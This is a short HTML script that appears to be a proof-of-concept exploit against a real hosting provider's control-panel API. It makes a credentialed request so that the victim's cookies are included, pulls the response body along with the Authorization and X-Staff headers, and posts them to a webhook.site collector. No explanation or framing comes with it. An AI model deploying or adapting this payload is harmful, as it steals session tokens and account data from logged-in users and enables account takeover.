<script>
const targetUrl = 'https://hpanel.hostinger.com/api/auth/api/external/v1/invitations?gaid=GA1.1.1770165202.1756321190';
const webhookUrl = 'https://webhook.site/a28a04ba-9bc8-4548-a92c-9b2b289f8a51';

fetch(targetUrl, {
    method: 'GET',
    credentials: 'include'
})
.then(async response => {
    const data = await response.json();
    const headers = {
        authorization: response.headers.get('Authorization'),
        xStaff: response.headers.get('X-Staff')
    };
    // Combine headers and body
    const payload = {
        headers,
        body: data
    };

    // Send to webhook
    return fetch(webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
    });
})
.then(res => console.log('Webhook response status:', res.status))
.catch(err => console.error('Error:', err));
</script>
